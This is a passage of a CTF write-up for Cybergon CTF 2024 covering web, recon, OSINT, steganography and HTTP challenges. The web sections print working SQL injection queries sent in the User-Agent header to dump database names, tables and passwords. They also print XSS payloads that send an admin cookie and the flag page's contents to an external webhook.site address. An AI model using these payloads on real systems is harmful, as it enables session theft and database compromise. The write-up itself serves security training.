![Logs link](/images/cybergon-2024/cybergon-2024-p73-415.png)

![Login logs](/images/cybergon-2024/cybergon-2024-p74-417.png)

I tried to understand how the challenge works, then started testing possible
vulnerabilities. I detected a SQL injection vulnerability on the User-Agent
value's endpoint:

![SQLi in UA](/images/cybergon-2024/cybergon-2024-p74-418.png)

Let's fix the SQL error (comment block) for the payload injection process using
`)#`:

![Fixed](/images/cybergon-2024/cybergon-2024-p74-419.png)

Let's dump the database name using the following query:

```text
User-Agent: 1337',(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA))#
```

![Database name](/images/cybergon-2024/cybergon-2024-p75-421.png)

Database name: `ctf`

We dumped the table names:

```text
User-Agent: 1337',(SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x637466))#
```

![Table names](/images/cybergon-2024/cybergon-2024-p75-423.png)

Table names: `logs`, `users`

We dumped the column names:

```text
User-Agent: 1337',(SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x7573657273))#
```

![Column names](/images/cybergon-2024/cybergon-2024-p76-425.png)

Column names: `id`, `username`, `password`

At this point we tried to dump data from all columns, but it was not
successful — the `GROUP_CONCAT` query was filtered. So we dumped single column
data:

```text
User-Agent: 1337',(SELECT password FROM users limit 0,1))#
```

![Flag from password column](/images/cybergon-2024/cybergon-2024-p76-426.png)

Bingo!! We got the flag value from the password column.

Flag: `CYBERGON_CTF2024{N0w_Ag3nt_PwN3d_Th3_S3rv3r}`

### DumbBot

![DumbBot](/images/cybergon-2024/cybergon-2024-p77-428.png)

First I opened the challenge URL and checked how the challenge works. I found
an endpoint that reflects the input, so I started trying to get XSS:

![Reflected input](/images/cybergon-2024/cybergon-2024-p77-429.png)

![XSS test](/images/cybergon-2024/cybergon-2024-p77-430.png)

I noticed there is a reCAPTCHA, so we needed to bypass it. I found a post about
reCAPTCHA bypass on HackTricks, then edited the payload, inserted it into the
challenge URL endpoint — it bypassed the reCAPTCHA. Then I sent the payload to
the bot to get the admin cookie:

![Recaptcha bypass](/images/cybergon-2024/cybergon-2024-p78-436.png)

We created the payload for admin cookie theft:

```html
/gallery?src="><div ng-controller="CarouselController as c" ng-init="c.init()">
[[c.element.ownerDocument.defaultView.parent.location="https://webhook.site/86fffe54-958c-455f-81d1-36c194ee934d?"%2Bc.element.ownerDocument.cookie]]<div carousel><div slides></div></div>
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script><svg onload="">
```

![Payload](/images/cybergon-2024/cybergon-2024-p78-437.png)

So I got the admin cookies, then used them to check the admin endpoint and
found a hidden parameter in the admin endpoint that also reflects user input.
Then I tried to get XSS and sent it to the bot to get the flag:

![Admin cookies](/images/cybergon-2024/cybergon-2024-p79-440.png)

![Admin endpoint](/images/cybergon-2024/cybergon-2024-p79-441.png)

The `h1dd3nparam-cyBerG0n` parameter can control the admin bot using the XSS
vulnerability:

![Hidden param](/images/cybergon-2024/cybergon-2024-p80-443.png)

![Bot control](/images/cybergon-2024/cybergon-2024-p80-444.png)

So we planned to read the flag via the admin bot's action and created the
following JavaScript payload:

```html
/admin?h1dd3nparam-cyBerG0n=<script>fetch("/flag").then(res => res.text()).then(res => {return fetch(https://webhook.site/86fffe54-958c-455f-81d1-36c194ee934d?content=${res})})</script>
```

At this time the bot will view our payload — it requests the flag page and then
sends the flag page response data to our webhook:

![Fetch payload](/images/cybergon-2024/cybergon-2024-p80-445.png)

Let's try to read the flag!!!

![Webhook 1](/images/cybergon-2024/cybergon-2024-p81-447.png)

![Webhook 2](/images/cybergon-2024/cybergon-2024-p81-448.png)

Finally, we got the flag via the admin bot's flag-read action.

Flag: `CYBERGON_CTF2024{Th3_DumB_dUmB_b0T!}`

## Reconnaissance

### Validation

![Validation](/images/cybergon-2024/cybergon-2024-p82-450.png)

To solve the challenge, we used `nslookup` to query the DNS records of the
domain `flaghhunt.lol`. We retrieved all TXT records:

```console
$ nslookup -type=TXT flaghhunt.lol
```

![TXT records](/images/cybergon-2024/cybergon-2024-p82-451.png)

The query returned a total of 4 TXT records. Among these, one record contained
`v=spf1`, identifying it as an SPF record. So the flag value is `{4:1}`.

Flag: `CYBERGON_CTF2024{4:1}`

### Secure Life

![Secure Life](/images/cybergon-2024/cybergon-2024-p83-453.png)

In this challenge we needed to find the challenge file certificate's expiration
date. We found it using `openssl` — the certificate's expiration date is
Nov 24 20:38:00 2039 GMT:

![openssl](/images/cybergon-2024/cybergon-2024-p83-454.png)

Flag: `CYBERGON_CTF2024{2039:11:24:20:38:00}`

### Uncover

![Uncover](/images/cybergon-2024/cybergon-2024-p84-457.png)

After doing some searches, I found the AADInternals tool interesting, which can
be used for gathering information from Azure AD administration. After cloning
the modules from [github.com/Gerenios/AADInternals](https://github.com/Gerenios/AADInternals):

```powershell
Set-ExecutionPolicy Unrestricted
Import-Module .\AADInternals.psd1
Get-AADIntTenantDomains -Domain intelbyte.io
```

We can get the tenant name:

![Tenant](/images/cybergon-2024/cybergon-2024-p84-458.png)

Flag: `CYBERGON_CTF2024{goddamnit2024.onmicrosoft.com}`

### Discovery

![Discovery](/images/cybergon-2024/cybergon-2024-p85-460.png)

To solve the challenge of enumerating subdomains under `flaghunt.lol`, we began
with VirusTotal, Sublist3r, and various online subdomain discovery services,
which revealed only a few subdomains. Realizing these methods were
insufficient, we turned to active enumeration with gobuster:

```console
$ gobuster dns -d flaghunt.lol -w Subdomain.txt
```

![gobuster](/images/cybergon-2024/cybergon-2024-p85-461.png)

We successfully identified **19** subdomains associated with the domain.

Flag: `CYBERGON_CTF2024{19}`

### Leakage

![Leakage](/images/cybergon-2024/cybergon-2024-p86-463.png)

Searching `api.flaghunt.lol` on GitHub, you get an interesting repo from
`dummybear00`:

![GitHub repo](/images/cybergon-2024/cybergon-2024-p86-464.png)

From the repo, there are 4 commits in the history — checking them will get you
the flag right away:

![Commit history](/images/cybergon-2024/cybergon-2024-p87-466.png)

Flag: `CYBERGON_CTF2024{34af-atg4-34gs-f234g-79g6}`

## OSINT

### Vacation (1)

![Vacation 1](/images/cybergon-2024/cybergon-2024-p88-469.png)

The challenge requires you to identify the hotel name, city, and country where
the photo was taken.

Let's check the image file format. The image is in HEIC format; convert it to
PNG using [cloudconvert.com/heif-to-png](https://cloudconvert.com/heif-to-png):

![HEIC to PNG](/images/cybergon-2024/cybergon-2024-p88-471.png)

When I searched for image information using Google Images, it is Ha Long city,
Vietnam:

![Google image search](/images/cybergon-2024/cybergon-2024-p89-473.png)

Looking at Google Maps, we can guess the hotel's location:

![Google Maps](/images/cybergon-2024/cybergon-2024-p89-474.png)

After analyzing the photo and using Google Maps, I identified a possible match:
the **Muong Thanh Luxury Ha Long Centre Hotel**, situated in Ha Long City,
Vietnam.

Flag: `CYBERGON_CTF2024{Muong Thanh Luxury Ha Long Centre Hotel, Ha Long, Vietnam}`

### Vacation (2)

![Vacation 2](/images/cybergon-2024/cybergon-2024-p90-476.png)

First, I downloaded the given file and opened the image. I found two men
wearing Japanese kimonos and holding katana swords:

![Kimonos](/images/cybergon-2024/cybergon-2024-p90-477.png)

I also noticed a cosplay board in the photo. Then I searched Google using the
keywords "the best Japan cosplay place in Ha Long Bay, Vietnam" because we
already knew the location from Vacation (1):

![Cosplay board](/images/cybergon-2024/cybergon-2024-p91-480.png)

![Search](/images/cybergon-2024/cybergon-2024-p91-481.png)

I found websites where Japanese cosplay photos were uploaded, and discovered
locations that matched the challenge photo:
[halong.sunworld.vn — combo ticket](https://halong.sunworld.vn/tin-tuc/combo-gia-ve-vi-vu-cap-treo-kham-pha-lang-ren-than-kiem.html)

![Sun World](/images/cybergon-2024/cybergon-2024-p91-482.png)

The name of this location is "SHOT-SHAPED VILLE" in English. I tried submitting
the English name but it was incorrect, so I used the Vietnamese name
(Lang Ren Than Kiem) instead:

![Location name](/images/cybergon-2024/cybergon-2024-p92-484.png)

![Vietnamese name](/images/cybergon-2024/cybergon-2024-p92-485.png)

Location name (Vietnamese): Lang Ren Than Kiem, HaLong

Flag: `CYBERGON_CTF2024{Lang Ren Than Kiem}`

### Favorite Journal

![Favorite Journal](/images/cybergon-2024/cybergon-2024-p93-487.png)

First I downloaded the given file and, when I opened it, I knew it was the
Shwethway journal. Then I searched "shwethway journal volume 1 number 1" in
Google. I found a website sharing a Google Drive for Shwethway vol 1 with the
published date. In that file I found the printing house registration number:

![Journal](/images/cybergon-2024/cybergon-2024-p93-488.png)

![Registration number](/images/cybergon-2024/cybergon-2024-p94-490.png)

Flag: `CYBERGON_CTF2024{4-1-69_0032}`

### The Flight

![The Flight](/images/cybergon-2024/cybergon-2024-p94-491.png)

I got the password "ICEMAN" from the Triple Quiz challenge, so I searched the
name in the browser and found it is the nickname of Victor Lindelöf. Then I
searched the new manager's name and his recent traveled flight. I found the
ICAO code of the flight on Twitter (x.com):

![Flight search](/images/cybergon-2024/cybergon-2024-p95-493.png)

![ICAO code](/images/cybergon-2024/cybergon-2024-p95-494.png)

Flag: `CYBERGON_CTF2024{BYJ, MAN, 4950D2}`

### The Train & The Bridge

![The Train & The Bridge](/images/cybergon-2024/cybergon-2024-p96-497.png)

First, I downloaded the `challenge.rar` file and extracted it. I found two
files: a train photo and a video file. I took a screenshot of one part of the
video and found it in Google Images, then found the original video on YouTube.
I searched the train image in Google and found it is DF1237, then searched the
DF1237 build year and found it on
[railgallery.ru/railcar/266995](https://railgallery.ru/railcar/266995/#n434975):

![Screenshot search](/images/cybergon-2024/cybergon-2024-p96-498.png)

![Build year](/images/cybergon-2024/cybergon-2024-p97-501.png)

Flag: `CYBERGON_CTF2024{1969_gokteik_09-05-2019}`

### History repeats itself

![History repeats itself](/images/cybergon-2024/cybergon-2024-p97-502.png)

First I downloaded the image file and searched it with Google Images. I know it
is the Panglong Agreement photo. I found the Panglong Agreement date on
[Wikipedia](https://en.wikipedia.org/wiki/Panglong_Agreement):

![Panglong Agreement](/images/cybergon-2024/cybergon-2024-p98-505.png)

Flag: `CYBERGON_CTF2024{February_12_1947}`

### The Stadium

![The Stadium](/images/cybergon-2024/cybergon-2024-p98-506.png)

First I downloaded the given image and searched it in Google Images. I found
the name is Centre Bell, located in Montreal, Quebec, Canada, built in 1993. I
found the capacity of the Bell Centre on
[Wikipedia — List of indoor arenas in Canada](https://en.wikipedia.org/wiki/List_of_indoor_arenas_in_Canada):

![Bell Centre](/images/cybergon-2024/cybergon-2024-p99-508.png)

Flag: `CYBERGON_CTF2024{Montreal_Quebec_21700_1993}`

### The Statue

![The Statue](/images/cybergon-2024/cybergon-2024-p99-509.png)

Using reverse image search, I found the location: **Maha Bodhi Ta Htaung
Standing Buddha**. From there, using Google Maps and Street View features, I
got the exact location where the person who took the picture was standing:

![Google Maps location](/images/cybergon-2024/cybergon-2024-p100-511.png)

Flag: `CYBERGON_CTF2024{22.0801,95.2885}`

### The Pagoda

![The Pagoda](/images/cybergon-2024/cybergon-2024-p100-512.png)

From the picture, I performed reverse image search and got the Ananda Temple.
Using What3words, we can quickly identify the donation center:
`snowdrops.outfield.delis`:

![Ananda Temple](/images/cybergon-2024/cybergon-2024-p101-515.png)

For the standing Buddhas' names, we can get them from
[Wikipedia — Ananda Temple](https://en.wikipedia.org/wiki/Ananda_Temple).

Flag: `CYBERGON_CTF2024{snowdrops.outfield.delis_4_Gautama_Kakusandha_Kassapa_Konagamana}`

## STEGANO

### Truesight

![Truesight](/images/cybergon-2024/cybergon-2024-p102-518.png)

First, I downloaded the given file and, when I opened it, it was corrupt. I
opened it in [hexed.it](https://hexed.it/) and noticed the first 8 bytes of the
image had been deleted, so I added the correct 8 bytes (PNG magic header) and
re-opened the image. I got the flag:

![Hex edit](/images/cybergon-2024/cybergon-2024-p102-519.png)

![Flag](/images/cybergon-2024/cybergon-2024-p103-521.png)

Flag: `CYBERGON_CTF2024{y0u_g07_7h3_r!gh7_s1gn5}`

### Invisible

![Invisible](/images/cybergon-2024/cybergon-2024-p103-522.png)

First, I downloaded the given file from the challenge and uploaded it to Aperi
Solve, then got the possible password:

![AperiSolve](/images/cybergon-2024/cybergon-2024-p104-524.png)

Then I checked the image metadata using `exiftool` — nothing. Then I used
`steghide` to extract hidden data with the possible password and got `flag.txt`
using the password `getyourflag`:

![steghide extract](/images/cybergon-2024/cybergon-2024-p104-525.png)

Flag: `CYBERGON_CTF2024{n07h1ng_5t4ys_h1dd3n}`

### What's behind the wall ?

![What's behind the wall](/images/cybergon-2024/cybergon-2024-p105-527.png)

I downloaded the given rar file and extracted it. I found `challenge4.png` and
`JS.txt`, then uploaded them to AperiSolve and got a password:

![AperiSolve](/images/cybergon-2024/cybergon-2024-p105-528.png)

I didn't know what it was. After thinking a lot, I got the idea to use
`stegsnow`:

![stegsnow](/images/cybergon-2024/cybergon-2024-p106-530.png)

Flag: `CYBERGON_CTF2024{3X1f_w1th_5n0w5}`

## HTTP

### Protocol

![Protocol](/images/cybergon-2024/cybergon-2024-p107-532.png)

First I tried to request it using curl — access denied. I added the content
type and requested again, then got the flag:

![curl request](/images/cybergon-2024/cybergon-2024-p107-533.png)

Flag: `CYBERGON_CTF2024{CybEr!-2024-G0n!-GeNt}`

---

Thanks for the challenges, Cybergon!

![Thanks](/images/cybergon-2024/cybergon-2024-p108-536.png)

**Team pwn_|>**

![Team](/images/cybergon-2024/cybergon-2024-p108-540.png)
